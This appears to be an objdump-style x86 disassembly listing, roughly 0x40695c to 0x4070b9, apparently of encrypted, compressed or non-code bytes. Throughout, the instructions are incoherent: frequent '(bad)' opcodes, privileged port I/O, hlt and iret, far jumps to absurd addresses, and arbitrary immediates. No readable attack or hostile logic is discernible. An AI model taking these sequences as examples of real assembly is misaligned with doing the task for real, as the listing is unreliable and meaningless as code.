  40695c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40695d:	ja     0x40691d
  40695f:	ret    0x9fb9
  406962:	call   0x85d11146
  406967:	xlat   BYTE PTR ds:[ebx]
  406968:	ror    DWORD PTR [edi],0x27
  40696b:	pushf  
  40696c:	in     eax,dx
  40696d:	and    eax,0xb1498bc9
  406972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406973:	jb     0x4069d5
  406975:	fcmovbe st,st(5)
  406977:	or     eax,0x72922a74
  40697c:	fbstp  TBYTE PTR [edi]
  40697e:	iret   
  40697f:	rcl    ah,0x24
  406982:	fistp  QWORD PTR cs:[esi]
  406985:	or     eax,ecx
  406987:	es inc ebx
  406989:	jae    0x406994
  40698b:	fldenv [ecx+0x49dce91e]
  406991:	jmp    0x406934
  406993:	mov    bl,0x3
  406995:	cmp    DWORD PTR [edi],edi
  406997:	ins    BYTE PTR es:[edi],dx
  406998:	cmp    al,0xde
  40699a:	jp     0x406a00
  40699c:	dec    ebp
  40699d:	mov    dh,0x61
  40699f:	fisubr WORD PTR [ecx]
  4069a1:	in     eax,dx
  4069a2:	mov    ah,0xc3
  4069a4:	mov    dh,0xcd
  4069a6:	add    eax,0x8d3be4df
  4069ab:	bound  eax,QWORD PTR [eax-0x3cc0b398]
  4069b1:	add    DWORD PTR [edx+0x248e3017],0x6c18166d
  4069bb:	push   ds
  4069bc:	sar    DWORD PTR [ebx],1
  4069be:	(bad)
  4069c2:	rol    cl,1
  4069c4:	dec    edi
  4069c5:	repz aas 
  4069c7:	push   ss
  4069c8:	idiv   eax
  4069ca:	into   
  4069cb:	and    DWORD PTR [ebx],0xffffff93
  4069ce:	add    DWORD PTR [edi-0x29f1abb2],eax
  4069d4:	xor    eax,0xda2c220d
  4069d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069db:	mov    ebp,0x67620013
  4069e0:	sub    dh,BYTE PTR [ecx+ebx*2]
  4069e3:	adc    ch,cl
  4069e5:	push   es
  4069e6:	xchg   esp,eax
  4069e7:	push   esi
  4069e8:	pop    edx
  4069e9:	sbb    eax,0x3cd7709b
  4069ee:	mov    esp,0x6a8bb2db
  4069f3:	jmp    0x406a2f
  4069f5:	adc    esp,DWORD PTR [edx]
  4069f7:	pop    esp
  4069f8:	inc    edx
  4069f9:	inc    esi
  4069fa:	sbb    eax,0xc57a46d2
  4069ff:	repz mov edi,0x928789d7
  406a05:	jo     0x406a35
  406a07:	jns    0x406a79
  406a09:	add    BYTE PTR [eax+0x54abcce8],bh
  406a0f:	and    DWORD PTR [ecx],0x3f92828e
  406a15:	xor    al,0x89
  406a17:	test   al,0x91
  406a19:	out    dx,eax
  406a1a:	cli    
  406a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a1c:	adc    BYTE PTR [ebx+0x78331c29],bl
  406a22:	test   al,0x18
  406a24:	pop    ebx
  406a25:	retf   
  406a26:	faddp  st(0),st
  406a28:	repnz hlt 
  406a2a:	mov    edi,0x60b036df
  406a2f:	adc    eax,0x13058d09
  406a34:	lea    ecx,[esi]
  406a36:	add    al,dl
  406a38:	inc    DWORD PTR [ebx+0x47de36e6]
  406a3e:	dec    esi
  406a3f:	jae    0x406a6e
  406a41:	mov    BYTE PTR [esp+edx*4],bh
  406a44:	dec    sp
  406a46:	or     ah,BYTE PTR [esp+ebp*8]
  406a49:	mov    BYTE PTR [esi+ebx*8-0x4aac9e6b],dh
  406a50:	adc    DWORD PTR [edx+0x43c2b1b],ebx
  406a56:	adc    edi,0xfffffff4
  406a59:	adc    dl,ah
  406a5b:	mov    bl,0x55
  406a5d:	mov    al,0x88
  406a5f:	inc    ebx
  406a60:	push   ebx
  406a61:	xchg   edi,eax
  406a62:	stos   BYTE PTR es:[edi],al
  406a63:	mov    dl,BYTE PTR [eax+edi*4-0x1f9608fb]
  406a6a:	je     0x406abd
  406a6c:	setno  BYTE PTR [ebp-0x3]
  406a70:	mov    bh,0xb8
  406a72:	lahf   
  406a73:	mov    ds:0xacd2864,al
  406a78:	pop    esp
  406a79:	xchg   ecx,eax
  406a7a:	mov    al,ds:0x3ffd9015
  406a7f:	mov    esi,0x5b02de73
  406a84:	mov    esp,0xdc9d1a6c
  406a89:	dec    esi
  406a8a:	(bad)  
  406a8b:	inc    ecx
  406a8c:	xchg   edx,eax
  406a8d:	neg    ah
  406a8f:	ins    BYTE PTR es:[edi],dx
  406a90:	fwait
  406a91:	gs pop ds
  406a93:	mov    dh,0x5d
  406a95:	and    dh,BYTE PTR [esi-0x50]
  406a98:	sahf   
  406a99:	mov    BYTE PTR [edx+0x10],bl
  406a9c:	jae    0x406a9d
  406a9e:	inc    ecx
  406a9f:	jbe    0x406ae6
  406aa1:	cmp    eax,DWORD PTR [eax]
  406aa3:	jne    0x406acd
  406aa5:	mov    al,ds:0x9982cf49
  406aaa:	out    0x6e,al
  406aac:	icebp  
  406aad:	(bad)  
  406aae:	jo     0x406aec
  406ab0:	out    dx,al
  406ab1:	mov    BYTE PTR [ebx],al
  406ab3:	shl    edi,1
  406ab5:	lds    esi,FWORD PTR [edi-0x2a]
  406ab8:	adc    ax,0xab36
  406abc:	dec    eax
  406abd:	mov    esi,0x2a8d2f19
  406ac2:	sbb    esi,esi
  406ac4:	in     al,0xf2
  406ac6:	aam    0x59
  406ac8:	inc    edx
  406ac9:	mov    ebx,0x33dc1e0d
  406ace:	sub    ebp,DWORD PTR [esi+0x24cc27b5]
  406ad4:	stos   DWORD PTR es:[edi],eax
  406ad5:	mov    al,0x94
  406ad7:	pop    ebx
  406ad8:	(bad)  
  406ad9:	cld    
  406ada:	fisttp QWORD PTR ds:0x413b86b6
  406ae0:	mov    ah,BYTE PTR [ecx-0x4916598e]
  406ae6:	pop    ebp
  406ae7:	in     eax,dx
  406ae8:	or     al,0x7e
  406aea:	loop   0x406a93
  406aec:	xlat   BYTE PTR ds:[ebx]
  406aed:	fldcw  WORD PTR [esi-0xb]
  406af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406af1:	push   ecx
  406af2:	fwait
  406af3:	cmp    DWORD PTR [esi-0x372d0bec],edx
  406af9:	adc    DWORD PTR [edi+edi*8+0x1429d88],edi
  406b00:	jb     0x406aa4
  406b02:	cli    
  406b03:	jmp    0x406b80
  406b05:	jge    0x406b58
  406b07:	(bad)  
  406b08:	loopne 0x406b61
  406b0a:	sub    al,0x16
  406b0c:	cmp    al,0xf0
  406b0e:	push   es
  406b0f:	sti    
  406b10:	add    eax,0x46096d22
  406b15:	xor    BYTE PTR [ebx+0x2f],bl
  406b18:	retf   0x5ba5
  406b1b:	xchg   edx,eax
  406b1c:	ror    BYTE PTR [eax+0x1b],0x61
  406b20:	outs   dx,BYTE PTR ds:[esi]
  406b21:	adc    eax,0xdcfea5c8
  406b26:	push   ds
  406b27:	adc    edi,DWORD PTR [edi-0x5d287ef3]
  406b2d:	fnstcw WORD PTR [edx+ecx*8+0x1c]
  406b31:	(bad)
  406b35:	and    ah,ch
  406b37:	clc    
  406b38:	xor    edx,DWORD PTR [esi]
  406b3a:	xor    bl,BYTE PTR [edx]
  406b3c:	inc    esi
  406b3d:	push   0x0
  406b3f:	jecxz  0x406aed
  406b41:	out    0xef,eax
  406b43:	shl    BYTE PTR [eax+0x7bb7e497],0x69
  406b4a:	jb     0x406ae6
  406b4c:	sti    
  406b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b4e:	mov    ds:0x95112e6f,al
  406b53:	xchg   ebx,eax
  406b54:	cmc    
  406b55:	lods   eax,DWORD PTR ds:[esi]
  406b56:	iret   
  406b57:	push   ds
  406b58:	dec    ebp
  406b59:	sbb    BYTE PTR [ebx+0x5c],0x47
  406b5d:	add    eax,DWORD PTR [edi+eiz*1+0x2e55a242]
  406b64:	(bad)  
  406b65:	inc    eax
  406b66:	lock (bad) 
  406b68:	ins    DWORD PTR es:[edi],dx
  406b69:	mov    ah,0xf0
  406b6b:	inc    eax
  406b6c:	scas   eax,DWORD PTR es:[edi]
  406b6d:	pushw  cs
  406b6f:	cmc    
  406b70:	add    dl,BYTE PTR [edx]
  406b72:	stc    
  406b73:	(bad)  
  406b75:	std    
  406b76:	cmp    eax,0xcdd7d0db
  406b7b:	and    DWORD PTR [eax+eax*8],esp
  406b7e:	cmp    eax,0xbd7ccf0f
  406b83:	mov    ecx,0xd9000258
  406b88:	cld    
  406b89:	adc    eax,ebp
  406b8b:	adc    DWORD PTR [esi],edi
  406b8d:	cmp    al,0xb4
  406b8f:	mov    ch,0xfb
  406b91:	test   BYTE PTR [edi+0x5d],dh
  406b94:	xor    esp,edx
  406b96:	dec    edx
  406b97:	adc    DWORD PTR [edi-0x62],edi
  406b9a:	jl     0x406c1b
  406b9c:	ins    DWORD PTR es:[edi],dx
  406b9d:	and    BYTE PTR [ecx],ch
  406b9f:	sahf   
  406ba0:	gs add al,0xdc
  406ba3:	test   edx,ebp
  406ba5:	nop
  406ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ba7:	addr16 add al,0xde
  406baa:	jp     0x406c1f
  406bac:	lods   eax,DWORD PTR ds:[esi]
  406bad:	sar    BYTE PTR cs:[eax],0x28
  406bb1:	out    0x35,eax
  406bb3:	lea    esp,[edi+0x2d]
  406bb6:	outs   dx,BYTE PTR ds:[esi]
  406bb7:	retf   0x4519
  406bba:	adc    ebx,edi
  406bbc:	inc    edx
  406bbd:	daa    
  406bbe:	push   esp
  406bbf:	dec    ebp
  406bc0:	repnz mov ebp,0xa81ec717
  406bc6:	div    DWORD PTR [ebx-0x99c3f58]
  406bcc:	nop
  406bcd:	sbb    al,BYTE PTR [ebp-0x13053d3c]
  406bd3:	sub    eax,0xc31123b8
  406bd8:	outs   dx,DWORD PTR ds:[esi]
  406bd9:	mov    eax,0x4752505c
  406bde:	ja     0x406c05
  406be0:	scas   al,BYTE PTR es:[edi]
  406be1:	push   esi
  406be2:	and    DWORD PTR [ebp+0x27550e94],ecx
  406be8:	push   cs
  406be9:	addr16 mov ah,0x74
  406bec:	push   ebx
  406bed:	push   0xa47ffa77
  406bf2:	cs jb  0x406c5c
  406bf5:	imul   edi,edi,0xffffffd2
  406bf8:	cld    
  406bf9:	pushf  
  406bfa:	xchg   bl,al
  406bfc:	xchg   ebp,eax
  406bfd:	loop   0x406c4f
  406bff:	mov    dh,0xd1
  406c01:	test   al,0x3b
  406c03:	rol    BYTE PTR [ecx+0x79],0x37
  406c07:	iret   
  406c08:	outs   dx,BYTE PTR ds:[esi]
  406c09:	mov    edx,0x43bc999b
  406c0e:	add    ebp,0x6f
  406c11:	dec    esp
  406c12:	xchg   DWORD PTR [ecx-0x13814f72],ebp
  406c18:	jnp    0x406bf6
  406c1a:	outs   dx,DWORD PTR ds:[esi]
  406c1b:	(bad)  
  406c1c:	sub    cl,BYTE PTR [esi]
  406c1e:	jge    0x406bc7
  406c20:	aam    0x9f
  406c22:	scas   al,BYTE PTR es:[edi]
  406c23:	jne    0x406c56
  406c25:	inc    ebx
  406c26:	imul   ebx,DWORD PTR [ebx-0x61],0xffffff81
  406c2a:	jne    0x406bc7
  406c2c:	fld    QWORD PTR [eax-0x75]
  406c2f:	pop    ss
  406c30:	xchg   ecx,eax
  406c31:	sar    DWORD PTR [esi],1
  406c33:	add    esp,0xffffffdc
  406c36:	mov    bl,0x10
  406c38:	xchg   edx,eax
  406c39:	(bad)  
  406c3a:	lods   eax,DWORD PTR ds:[esi]
  406c3b:	ret    
  406c3c:	jle    0x406c80
  406c3e:	cwde   
  406c3f:	jmp    FWORD PTR [ecx+eax*2]
  406c42:	call   DWORD PTR [ebx-0x3f]
  406c45:	cmp    al,0x2d
  406c47:	jmp    0x406cb8
  406c49:	dec    esp
  406c4a:	lods   al,BYTE PTR ds:[esi]
  406c4b:	pop    ebx
  406c4c:	or     ecx,ebp
  406c4e:	sbb    al,0x58
  406c50:	rcr    ecx,cl
  406c52:	sbb    DWORD PTR [ebx-0x1d],edi
  406c55:	data16 (bad) 
  406c57:	mov    cl,0x8c
  406c59:	push   ebx
  406c5a:	xor    ebx,DWORD PTR [ebp+0x7be30625]
  406c60:	dec    esi
  406c61:	pop    ebx
  406c62:	or     DWORD PTR [ebx],esp
  406c64:	dec    esi
  406c65:	dec    esp
  406c66:	sti    
  406c67:	jecxz  0x406c7a
  406c69:	mov    ch,0xb5
  406c6b:	or     edi,DWORD PTR [ebx+0x63]
  406c6e:	xor    ebp,DWORD PTR ds:0x30662010
  406c74:	repz in eax,0xa3
  406c77:	mov    al,ds:0x5ce441b5
  406c7c:	outs   dx,BYTE PTR ds:[esi]
  406c7d:	and    BYTE PTR [ebp-0x4b],ah
  406c80:	adc    eax,0x5eadd780
  406c85:	out    0xc6,al
  406c87:	sub    edx,DWORD PTR [esi-0x54]
  406c8a:	push   ebp
  406c8b:	inc    edi
  406c8c:	(bad)  
  406c8d:	xor    ebp,ebp
  406c8f:	je     0x406cb4
  406c91:	adc    esp,DWORD PTR [ecx-0x76]
  406c94:	xor    BYTE PTR [edi-0x5fa920c3],ah
  406c9a:	sub    DWORD PTR [eax+0x57],0xf18c0ff9
  406ca1:	xlat   BYTE PTR ds:[ebx]
  406ca2:	neg    DWORD PTR [ecx+0x1e]
  406ca5:	bound  eax,QWORD PTR [ebp+ecx*2-0x60]
  406ca9:	jmp    0xcaeb:0x82cbb873
  406cb0:	mov    ebx,0x685bb580
  406cb5:	leave  
  406cb6:	stc    
  406cb7:	scas   al,BYTE PTR es:[edi]
  406cb8:	pusha  
  406cb9:	sub    al,0x15
  406cbb:	adc    DWORD PTR [esi-0xeb28838],esp
  406cc1:	mov    ebx,0xe2e392c7
  406cc6:	xchg   ebp,eax
  406cc7:	cwde   
  406cc8:	pop    ecx
  406cc9:	out    dx,al
  406cca:	push   ebx
  406ccb:	dec    eax
  406ccc:	mov    al,ds:0xe0551890
  406cd1:	stc    
  406cd2:	sub    eax,0x704adf02
  406cd7:	mov    ebx,fs
  406cd9:	mov    WORD PTR [eax],cs
  406cdb:	std    
  406cdc:	pop    ebx
  406cdd:	sbb    BYTE PTR [ebp-0x1c],0x97
  406ce1:	mov    al,0x81
  406ce3:	xchg   eax,ebp
  406ce5:	es int 0xb3
  406ce8:	jg     0x406d30
  406cea:	dec    DWORD PTR [ebx]
  406cec:	faddp  st(2),st
  406cee:	mov    eax,ds:0x8d13906a
  406cf3:	aad    0xca
  406cf5:	add    ch,BYTE PTR [edi+0x542261a4]
  406cfb:	xchg   dh,bh
  406cfd:	cmp    bl,al
  406cff:	call   0x243b6fe4
  406d04:	push   esi
  406d05:	cmp    eax,DWORD PTR [esi+eax*4-0x30d0baac]
  406d0c:	outs   dx,DWORD PTR ds:[esi]
  406d0d:	mov    eax,ds:0x69006492
  406d12:	aaa    
  406d13:	inc    ecx
  406d14:	sub    ecx,DWORD PTR [esi]
  406d16:	sub    al,0x6c
  406d18:	push   edx
  406d19:	mov    dh,0xde
  406d1b:	or     BYTE PTR [eax+0x1c5be7a8],ah
  406d21:	fnstsw WORD PTR [esp+ecx*1-0x3e]
  406d25:	and    BYTE PTR ss:[edi],dl
  406d28:	push   edx
  406d29:	or     cl,0x31
  406d2c:	pop    ebx
  406d2d:	outs   dx,DWORD PTR ds:[esi]
  406d2e:	js     0x406d7f
  406d30:	retf   
  406d31:	aam    0x83
  406d33:	cmp    ah,dl
  406d35:	lock stc 
  406d37:	push   esi
  406d38:	in     al,dx
  406d39:	mov    al,0x35
  406d3b:	int3   
  406d3c:	sti    
  406d3d:	rol    BYTE PTR [ebp+0x65],1
  406d40:	push   edx
  406d41:	pop    edi
  406d42:	ror    al,cl
  406d44:	inc    edi
  406d45:	hlt    
  406d46:	stc    
  406d47:	adc    eax,0x52ed0e7b
  406d4c:	and    DWORD PTR [esi-0x588c8085],ebp
  406d52:	push   ebp
  406d53:	out    dx,al
  406d54:	jge    0x406da6
  406d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d57:	inc    esi
  406d58:	call   0xbaaa:0xc22c8687
  406d5f:	xor    DWORD PTR [eax-0x5e],esp
  406d62:	pushf  
  406d63:	neg    bl
  406d65:	call   FWORD PTR [edi-0xc]
  406d68:	inc    ecx
  406d69:	pop    ss
  406d6a:	cmp    al,0xa7
  406d6c:	xor    eax,0x15137b
  406d71:	mov    bl,0xce
  406d73:	test   DWORD PTR [esi+0x6b7988f1],0xe0508016
  406d7d:	ins    BYTE PTR es:[edi],dx
  406d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d7f:	shr    BYTE PTR [ebx+edx*4+0x91e7d82],1
  406d86:	not    DWORD PTR [esi]
  406d88:	lock jge 0x406d64
  406d8b:	leave  
  406d8c:	push   eax
  406d8d:	test   al,0x0
  406d8f:	mov    al,0x8a
  406d91:	rcr    DWORD PTR [ecx-0x3ab090d2],1
  406d97:	adc    al,0x92
  406d99:	test   eax,0x3abfcfef
  406d9e:	jl     0x406d35
  406da0:	xor    eax,0xde9b2d41
  406da5:	push   ebx
  406da6:	cmp    DWORD PTR [esi],ecx
  406da8:	mov    BYTE PTR [eax+0x37],dl
  406dab:	adc    DWORD PTR [esi],ebp
  406dad:	inc    esp
  406dae:	xchg   ecx,eax
  406daf:	xor    eax,DWORD PTR [esi]
  406db1:	xchg   ebp,eax
  406db2:	dec    BYTE PTR [edi-0x19c1c563]
  406db8:	js     0x406dd5
  406dba:	shl    edx,cl
  406dbc:	ins    BYTE PTR es:[edi],dx
  406dbd:	in     al,dx
  406dbe:	push   cs
  406dbf:	cdq    
  406dc0:	cmc    
  406dc1:	out    dx,al
  406dc2:	dec    ecx
  406dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dc4:	mov    DWORD PTR [eax+ebp*2-0x5293f89a],esi
  406dcb:	imul   edi,DWORD PTR [ebx*1+0x1ec04aab],0x201bbb6
  406dd6:	mov    edx,0xa67a02bc
  406ddb:	mov    ch,0xa2
  406ddd:	jmp    0xe9d17afd
  406de2:	xor    al,0x63
  406de4:	cdq    
  406de5:	clc    
  406de6:	(bad)  
  406de8:	test   cl,0x75
  406deb:	sbb    dh,ah
  406ded:	fist   DWORD PTR [ecx]
  406def:	test   al,0xf7
  406df1:	popf   
  406df2:	out    0x8f,eax
  406df4:	sub    dl,al
  406df6:	mov    BYTE PTR [edx+0x60],bh
  406df9:	sub    BYTE PTR [esp+ecx*8],bl
  406dfc:	push   ebp
  406dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dfe:	jnp    0x406df4
  406e00:	arpl   WORD PTR [edx+0x1a],di
  406e03:	ret    0xcdab
  406e06:	push   eax
  406e07:	popf   
  406e08:	shr    DWORD PTR [ebx-0x6b],cl
  406e0b:	ins    BYTE PTR es:[edi],dx
  406e0c:	mov    WORD PTR [ebx-0x5d],cs
  406e0f:	xor    BYTE PTR [eax-0x26abab2a],ch
  406e15:	jno    0x406e0f
  406e17:	in     eax,dx
  406e18:	stos   DWORD PTR es:[edi],eax
  406e19:	icebp  
  406e1a:	mov    edx,0xc29eb1ec
  406e1f:	stc    
  406e20:	mov    esi,ecx
  406e22:	rcr    DWORD PTR [esi-0x2c],0xd8
  406e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e27:	sbb    edx,0x64dd49f7
  406e2d:	cmp    BYTE PTR [eax+0xef85dc4],dh
  406e33:	aas    
  406e34:	mov    ch,0x1a
  406e36:	ret    
  406e37:	and    DWORD PTR [esi],ebx
  406e39:	push   ds
  406e3a:	js     0x406dc5
  406e3c:	js     0x406dde
  406e3e:	jp     0x406e02
  406e40:	out    dx,al
  406e41:	mov    ecx,0x3f517978
  406e46:	cmp    eax,0x7ed855e4
  406e4b:	pop    edi
  406e4c:	popf   
  406e4d:	push   0x26d3ec31
  406e52:	gs mov ah,0x4d
  406e55:	sbb    ah,dl
  406e57:	push   esi
  406e58:	fwait
  406e59:	leave  
  406e5a:	jnp    0x406ec3
  406e5c:	jmp    0x406ed4
  406e5e:	daa    
  406e5f:	es push edx
  406e61:	into   
  406e62:	xor    ebx,DWORD PTR [edi]
  406e64:	add    cl,cl
  406e66:	les    edx,FWORD PTR [esi]
  406e68:	(bad)  
  406e69:	mov    dl,0x35
  406e6b:	add    BYTE PTR [esi],al
  406e6d:	pop    es
  406e6e:	cwde   
  406e6f:	stos   BYTE PTR es:[edi],al
  406e70:	popa   
  406e71:	cmp    DWORD PTR [esi-0x21],esi
  406e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e75:	aas    
  406e76:	mov    al,ds:0x3ad44def
  406e7b:	aas    
  406e7c:	xchg   ecx,eax
  406e7d:	call   FWORD PTR [ebp+0x725bf6d2]
  406e83:	ss (bad) 
  406e85:	loop   0x406e96
  406e87:	cmp    al,0x86
  406e89:	sbb    eax,0x7b50c43
  406e8e:	mov    edi,0x5779ab6a
  406e93:	and    DWORD PTR [ebx+0x22],esi
  406e96:	inc    edi
  406e97:	pushf  
  406e98:	sub    al,0xa3
  406e9a:	dec    ecx
  406e9b:	pop    es
  406e9c:	stos   DWORD PTR es:[edi],eax
  406e9d:	out    dx,eax
  406e9e:	in     eax,0x90
  406ea0:	cmp    esp,DWORD PTR [edi+eiz*8]
  406ea3:	xchg   edx,eax
  406ea4:	out    dx,al
  406ea5:	dec    ebp
  406ea6:	or     BYTE PTR [ecx],0xa0
  406ea9:	push   esi
  406eaa:	pop    ebx
  406eab:	pop    eax
  406eac:	dec    eax
  406ead:	sbb    edx,DWORD PTR [ebp+0x7]
  406eb0:	fisub  WORD PTR [ecx-0x4c]
  406eb3:	jecxz  0x406ee7
  406eb5:	out    0x9e,eax
  406eb7:	cmp    cl,BYTE PTR ds:0xda4f4ea5
  406ebd:	add    ebx,DWORD PTR [ebp+0x70ecf9d5]
  406ec3:	xchg   ecx,eax
  406ec4:	ret    0xc13
  406ec7:	daa    
  406ec8:	out    dx,al
  406ec9:	and    al,al
  406ecb:	inc    ebp
  406ecc:	and    ch,al
  406ece:	and    eax,0x139ff22d
  406ed3:	ja     0x406f03
  406ed5:	lock adc eax,0xb3ec36dc
  406edb:	das    
  406edc:	and    DWORD PTR [eax-0x43],ebx
  406edf:	iret   
  406ee0:	pusha  
  406ee1:	(bad)  
  406ee2:	pop    edi
  406ee3:	adc    al,0x5c
  406ee5:	nop
  406ee6:	shl    DWORD PTR [ecx],0x50
  406ee9:	mov    ebp,0xa684c7f9
  406eee:	in     al,0x1
  406ef0:	or     bl,BYTE PTR [ecx+0x5b401ec3]
  406ef6:	xchg   edi,eax
  406ef7:	leave  
  406ef8:	xor    ebx,DWORD PTR [ecx-0x2a573216]
  406efe:	mov    cl,0x54
  406f00:	scas   eax,DWORD PTR es:[edi]
  406f01:	test   DWORD PTR [ecx+0x64c1e3a6],edi
  406f07:	jge    0x406f6f
  406f09:	xchg   edi,eax
  406f0a:	cdq    
  406f0b:	pop    ds
  406f0c:	jge    0x406f8c
  406f0e:	rcl    ebp,0xe5
  406f11:	cdq    
  406f12:	mov    al,ds:0xa423d0c5
  406f17:	cmp    eax,0xfaaf9b57
  406f1c:	jo     0x406f28
  406f1e:	push   esp
  406f1f:	and    edx,DWORD PTR [eax+0x39]
  406f22:	fs jp  0x406f2d
  406f25:	push   ebx
  406f26:	aas    
  406f27:	lods   al,BYTE PTR ds:[esi]
  406f28:	mov    edx,0xc2c3898f
  406f2d:	mov    esp,DWORD PTR [ecx+ecx*1-0x32d3c908]
  406f34:	pop    ebx
  406f35:	lea    edx,[ecx]
  406f37:	leave  
  406f38:	jle    0x406f2e
  406f3a:	mov    eax,0xb9ab7329
  406f3f:	ins    DWORD PTR es:[edi],dx
  406f40:	cmp    DWORD PTR [edi+0x6a],edi
  406f43:	jmp    0x8e83c133
  406f48:	dec    esp
  406f49:	cmp    eax,0xd8aa8426
  406f4e:	lahf   
  406f4f:	dec    esp
  406f50:	test   DWORD PTR [edi+0xe],0x6a1173c1
  406f57:	sbb    al,0x40
  406f59:	dec    ecx
  406f5a:	cmp    cl,bh
  406f5c:	pop    esi
  406f5d:	neg    dl
  406f5f:	retf   
  406f60:	cs jae 0x406f44
  406f63:	retf   
  406f64:	sbb    eax,0x1ce33515
  406f69:	fistp  WORD PTR [ebx-0x3c65e588]
  406f6f:	(bad)  
  406f71:	out    0xc,al
  406f73:	js     0x406fcc
  406f75:	test   BYTE PTR [esp+eax*8-0x7746b6d2],cl
  406f7c:	ficom  WORD PTR [ebx-0x48acd47a]
  406f82:	bound  edx,QWORD PTR ds:0xdbb669b6
  406f88:	pop    DWORD PTR [ebx]
  406f8a:	mov    edi,0x2b71e06d
  406f8f:	inc    ebx
  406f90:	or     eax,0xbbadd4e
  406f95:	push   ds
  406f96:	sbb    esp,DWORD PTR [eax+0x1d]
  406f99:	xchg   ebp,eax
  406f9a:	xchg   esi,eax
  406f9b:	iret   
  406f9c:	js     0x406fda
  406f9e:	push   esi
  406fa0:	cwde   
  406fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa2:	xchg   ebp,eax
  406fa3:	out    dx,eax
  406fa4:	js     0x406f2b
  406fa6:	add    eax,edx
  406fa8:	mov    esp,0x90dc9002
  406fad:	pop    ds
  406fae:	pop    esp
  406faf:	cld    
  406fb0:	mov    DWORD PTR [edx+0x60],ebx
  406fb3:	stc    
  406fb4:	add    dh,ch
  406fb6:	xor    BYTE PTR [ebx],dh
  406fb8:	dec    esi
  406fb9:	lea    eax,[eax]
  406fbb:	and    edi,DWORD PTR [ecx]
  406fbd:	jns    0x40703d
  406fbf:	pushf  
  406fc0:	pop    ebx
  406fc1:	xor    eax,0x6b0e0e56
  406fc6:	mov    ch,0x45
  406fc8:	(bad)  
  406fc9:	sub    dh,bl
  406fcb:	fwait
  406fcc:	jnp    0x406fb3
  406fce:	icebp  
  406fcf:	arpl   WORD PTR [esi-0x57df8101],bx
  406fd5:	sti    
  406fd6:	out    0xda,eax
  406fd8:	pop    ss
  406fd9:	pop    esi
  406fda:	jp     0x406fc6
  406fdc:	(bad)  
  406fdd:	fld    QWORD PTR [esi]
  406fdf:	cmp    BYTE PTR [edi+0x12],dl
  406fe2:	fwait
  406fe3:	ret    
  406fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fe5:	in     eax,dx
  406fe6:	lds    edi,FWORD PTR ds:0x97b87bdd
  406fec:	mov    ebp,0x82259d8a
  406ff1:	add    dh,BYTE PTR [ecx+0x3d50f7d4]
  406ff7:	jl     0x406fb8
  406ff9:	mov    eax,0xc5db7953
  406ffe:	jmp    0x5e7b:0xfffaf0a3
  407005:	add    ebx,ebp
  407007:	dec    ebp
  407008:	inc    ecx
  407009:	(bad)  
  40700a:	in     eax,0x87
  40700c:	xchg   BYTE PTR [edx],ah
  40700e:	xchg   BYTE PTR [ecx+eiz*2+0x76],bh
  407012:	add    ecx,DWORD PTR [edi+ebx*4+0x3019b984]
  407019:	adc    BYTE PTR [eax],cl
  40701b:	dec    esp
  40701c:	or     al,0x65
  40701e:	xchg   esp,eax
  40701f:	pop    ds
  407020:	xchg   ecx,eax
  407021:	pop    ds
  407022:	fcomp  QWORD PTR [edi+eax*2+0x39]
  407026:	std    
  407027:	inc    ecx
  407028:	out    0xa0,al
  40702a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40702b:	ret    
  40702c:	xlat   BYTE PTR ds:[ebx]
  40702d:	xchg   ebp,eax
  40702e:	inc    ebp
  40702f:	dec    esi
  407030:	ins    BYTE PTR es:[di],dx
  407032:	adc    DWORD PTR [edx-0x5fd67ac6],eax
  407038:	mov    esi,0x27b88c7
  40703d:	add    al,0x38
  40703f:	test   BYTE PTR [esi+0x6862d80],al
  407045:	outs   dx,BYTE PTR ds:[esi]
  407046:	pop    edx
  407047:	and    al,0x85
  407049:	jne    0x40707c
  40704b:	cld    
  40704c:	mov    esp,0x60fdadaf
  407051:	in     al,0x41
  407053:	sbb    eax,0xf28991cc
  407058:	pop    edi
  407059:	fwait
  40705a:	push   0x11
  40705c:	xlat   BYTE PTR ds:[ebx]
  40705d:	dec    ecx
  40705e:	fnstsw ax
  407060:	loopne 0x407043
  407062:	mov    esi,ebx
  407064:	leave  
  407065:	cwde   
  407066:	jg     0x40706c
  407068:	lods   al,BYTE PTR ds:[esi]
  407069:	push   0xdd64e0c6
  40706e:	daa    
  40706f:	cmc    
  407070:	pop    ebp
  407071:	loop   0x40709b
  407073:	sbb    ah,dh
  407075:	jns    0x40704f
  407077:	inc    BYTE PTR [edi]
  407079:	mov    ch,0x1f
  40707b:	shr    BYTE PTR ds:[esi],0x8e
  40707f:	fisubr DWORD PTR [esi-0x1db531af]
  407085:	icebp  
  407086:	sbb    BYTE PTR [esi+0x29],ah
  407089:	cdq    
  40708a:	add    ecx,edi
  40708c:	sub    ebx,esi
  40708e:	jb     0x40705a
  407090:	jae    0x407055
  407092:	or     esp,DWORD PTR [ecx]
  407094:	mov    ah,al
  407096:	icebp  
  407097:	mov    DWORD PTR [esi+0x4ffa1f97],ebp
  40709d:	int    0xf0
  40709f:	out    0xd0,eax
  4070a1:	xor    al,0x37
  4070a4:	aaa    
  4070a5:	pusha  
  4070a6:	push   cs
  4070a7:	xor    al,0xbd
  4070a9:	repnz stos BYTE PTR es:[di],al
  4070ac:	mov    esi,DWORD PTR [edi+edx*8+0x7b]
  4070b0:	adc    edi,DWORD PTR [ebx]
  4070b2:	das    
  4070b3:	das    
  4070b4:	mov    ecx,0xc5e42483
  4070b9:	cmp    BYTE PTR [eax-0x2c7e5702],ch
